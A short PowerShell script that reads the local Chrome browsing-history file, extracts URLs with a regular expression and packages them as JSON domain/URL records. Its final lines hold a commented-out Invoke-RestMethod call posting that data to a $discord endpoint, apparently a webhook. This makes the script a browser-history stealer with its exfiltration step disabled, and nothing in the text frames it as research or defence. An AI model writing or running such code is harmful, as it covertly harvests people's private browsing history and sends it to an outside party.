$filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history"

# Check if the file exists
if (!(Test-Path $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read the file contents
$fileContents = Get-Content -Path $filePath

# Extract URLs using regular expressions
$urlPattern = 'https?://(?:[-\w]+\.)+[a-zA-Z]{2,9}(?:/[-\w]+)*'
$urls = $fileContents | Select-String -Pattern $urlPattern -AllMatches | Foreach-Object { $_.Matches.Value }

# Create an array to store the JSON objects
$jsonObjects = @()

# Generate JSON objects with "domain" key
$urls | ForEach-Object {
    $url = $_
    $domain = [System.Uri]$url | Select-Object -ExpandProperty Host
    $jsonObject = [PSCustomObject]@{
        "domain" = $domain
        "url" = $url
    }
    $jsonObjects += $jsonObject
}

# Convert JSON objects to JSON format
$jsonData = $jsonObjects | ConvertTo-Json

#Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $jsonData
Write-Host $jsonData
